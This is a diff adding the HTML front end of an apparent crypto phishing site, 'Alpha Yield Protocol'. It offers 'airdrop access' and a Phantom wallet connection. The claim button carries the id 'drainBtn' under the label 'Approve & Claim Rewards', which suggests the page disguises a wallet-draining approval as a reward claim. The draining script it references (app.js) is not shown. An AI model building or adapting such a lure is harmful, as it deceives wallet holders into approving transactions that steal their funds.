@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alpha Yield Protocol | Connect & Claim</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Solana Web3.js from CDN (No install needed) -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Phantom Wallet Adapter -->
+    <script src="https://unpkg.com/@solana/wallet-adapter-react-ui@latest/src/styles.css"></script>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>Alpha Yield Protocol</h1>
+            <p>Premium DeFi Analytics & Airdrop Access</p>
+        </header>
+
+        <main id="app">
+            <!-- Loading State -->
+            <div id="loader" class="hidden">
+                <div class="spinner"></div>
+                <p>Connecting to Solana Mainnet...</p>
+            </div>
+
+            <!-- Connect Button -->
+            <button id="connectBtn" class="btn-primary">Connect Phantom Wallet</button>
+
+            <!-- Action Area (Hidden until connected) -->
+            <div id="actionArea" class="hidden">
+                <div class="card">
+                    <h2>Your Balance</h2>
+                    <p id="balanceDisplay">0.00 USDC</p>
+                    <button id="drainBtn" class="btn-secondary">Approve & Claim Rewards</button>
+                </div>
+            </div>
+
+            <!-- Status Message -->
+            <p id="statusMsg" class="status"></p>
+        </main>
+
+        <footer>
+            <p>Powered by Solana Blockchain</p>
+        </footer>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
